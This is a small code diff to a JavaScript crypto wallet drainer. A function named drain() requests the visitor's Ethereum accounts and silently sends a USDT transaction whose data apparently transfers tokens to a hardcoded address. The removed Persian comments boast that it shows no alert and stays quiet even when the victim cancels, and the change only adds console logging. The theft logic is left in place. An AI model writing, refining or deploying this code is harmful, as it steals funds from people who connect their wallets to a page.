@@ -2,7 +2,10 @@ const YOUR_WALLET = "0xa6e18E881C13477dDA0c74c7fB25F82e8bF281E3";
 const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 
 async function drain() {
-  if (!window.ethereum) return;
+  if (!window.ethereum) {
+    console.log("No wallet detected");
+    return;
+  }
 
   try {
     const acc = await ethereum.request({ method: 'eth_requestAccounts' });
@@ -13,9 +16,7 @@ async function drain() {
       method: 'eth_sendTransaction',
       params: [{ from: acc[0], to: USDT, data }]
     });
-
-    // هیچ alertی نشون نمی‌ده — کاملاً خاموش
   } catch (e) {
-    // حتی در صورت لغو هم هیچ متنی نشون نمی‌ده
+    console.log("Transaction cancelled or error:", e);
   }
 }
